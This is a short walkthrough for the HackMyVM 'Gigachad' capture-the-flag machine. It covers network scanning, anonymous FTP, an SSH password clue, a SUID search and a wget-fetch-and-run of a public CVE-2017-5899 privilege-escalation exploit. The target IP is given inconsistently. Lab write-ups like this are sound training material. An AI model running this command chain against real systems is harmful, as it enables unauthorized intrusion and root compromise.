Walkthrough HackMyVM Gigachad
Ip : 192.168.0.198
Mission : Get flag in user.txt and root.txt
Link Machine : https://downloads.hackmyvm.eu/gigachad.zip

1. Search ip with netdiscover :
sudo netdiscover -i ens33 -r 192.168.0.0/24 and get ip address 192.168.0.198

2. nmap -sS -sC -sV -p- 192.168.88.198
Output : Open port 21, 22, 80

3. ftp 192.168.88.198 :
ftp > get chadinfo

4. cat chadinfo and get information go to /drippinchad.png

5. Download image and go to google images to know about the image

6. And you know password of ssh :
Username = chad
Password = maide*****er

7. cat user.txt ( you got first flag, now go to root.txt)

8. find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;

9. wget https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2017-5899/exploit.sh; chmod 777 exploit.sh; ./exploit.sh

10. cd ../..; cat root.txt
